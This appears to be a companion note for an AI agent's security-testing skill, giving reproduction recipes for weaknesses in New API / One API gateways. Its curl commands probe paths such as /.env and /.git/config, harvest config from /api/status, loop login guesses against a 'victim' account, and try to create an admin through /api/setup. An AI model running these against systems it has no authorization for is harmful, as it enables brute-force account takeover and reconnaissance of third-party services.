# New API / One API Gateway — Field Notes & Reproduction Recipes

Companion detail for the `ai-api-gateway-security` skill.

## Reproduction recipes (from authorized assessment)

### R1. Confirm SPA fallback (eliminate false positives)
```bash
for f in "/.env" "/config.json" "/swagger" "/debug" "/.git/config" "/metrics" "/healthz" "/version"; do
  ct=$(curl -s -o /tmp/x -w "%{content_type}" -m 10 "https://TARGET$f")
  echo "$f -> ct=$ct bytes=$(wc -c </tmp/x)"
done
# If all return text/html with identical bytes => SPA fallback, NOT real files.
```

### R2. /api/status info disclosure
```bash
curl -s https://TARGET/api/status | head -c 1500
# Look for github_client_id, telegram_bot_name, passkey_rp_id, price, stripe_unit_price, usd_exchange_rate, register_enabled
```

### R3. Login rate-limit check
```bash
for i in 1 2 3 4 5 6; do
  curl -s -D - -o /dev/null -m 10 -X POST https://TARGET/api/user/login \
    -H "Content-Type: application/json" \
    -d '{"username":"victim","password":"guess'$i'"}' \
    | grep -iE "^HTTP|x-ratelimit|retry-after"
done
# All 200, no 429/Retry-After => vulnerable to brute-force.
```

### R4. Setup-guard verification (do NOT report critical without this)
```bash
curl -s https://TARGET/api/setup            # expect {"data":{"root_init":false,...}} (misleading)
curl -s -X POST https://TARGET/api/setup \
  -H "Content-Type: application/json" \
  -d '{"username":"bb_test","password":"TestPass123!"}'
# Patched => {"message":"系统已经初始化完成","success":false}
# Then verify no account: POST /api/user/login with those creds => expect failure.
```

## Ecosystem subdomains seen
- `topup.example.com` (auto top-up), `chat.example.com` (web chat GUI), `router.example.com` (base API, `/v1`).
- Notice endpoint: `GET /api/notice` returns markdown with Telegram channel links and base API URL — useful for mapping the ecosystem.

## Config flags worth noting from /api/status
- `password_register_enabled`, `register_enabled`, `password_login_enabled`
- `turnstile_check` (Cloudflare CAPTCHA; often false)
- `github_oauth`, `telegram_oauth`, `wechat_login`, `oidc_enabled`, `passkey_login`
- `email_verification` (registration gating)
